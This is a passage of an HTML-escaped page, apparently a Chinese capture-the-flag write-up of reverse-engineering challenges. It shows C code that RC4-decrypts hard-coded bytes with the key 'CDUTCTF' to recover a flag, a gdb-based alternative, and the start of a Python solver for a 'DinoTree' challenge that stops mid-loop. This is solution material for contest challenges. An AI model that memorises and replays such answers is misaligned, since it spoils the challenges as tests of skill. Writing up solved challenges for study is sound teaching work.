&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;rc4_crypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//S-box
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;CDUTCTF&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x74&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x26&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xd6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x38&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x73&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xe4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x85&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xb4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x4e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x01&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;rc4_init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;rc4_crypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pData=%s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;解法2.gdb调试&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在rc4_crypt处下断点&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201115192133564-1916767824.png&#34;/&gt;
&lt;ul&gt;
&lt;li&gt;向下单步调试（注意堆栈和寄存器的信息）&lt;/li&gt;
&lt;li&gt;得到flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192121049-1314966821.png&#34;
	width=&#34;538&#34;
	height=&#34;200&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192121049-1314966821_hu2772713131122074701.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192121049-1314966821_hu5086276777666716952.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;269&#34;
		data-flex-basis=&#34;645px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;题目名称dinotree&#34;&gt;题目名称：DinoTree
&lt;/h2&gt;&lt;p&gt;出题人:&lt;strong&gt;DorinXL&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;丢进f5，代码审计发现两个关键地方，查看qwq和qaq数组&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192122148-1746407952.png&#34;
	width=&#34;1085&#34;
	height=&#34;647&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192122148-1746407952_hu3592862711386233817.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192122148-1746407952_hu153957520019815924.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;167&#34;
		data-flex-basis=&#34;402px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192122947-1405316579.png&#34;
	width=&#34;635&#34;
	height=&#34;97&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192122947-1405316579_hu4053306175747400705.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192122947-1405316579_hu17203090513226695481.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;654&#34;
		data-flex-basis=&#34;1571px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以看到两个字符串，那么进行反解，要注意看for循环的长度&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;qwq&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noiFusL&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Wf;zmu&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;qaq&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ihs@}oRY5}ernD   &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# print(len(qwq))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# print(len(qaq))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;qwq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;
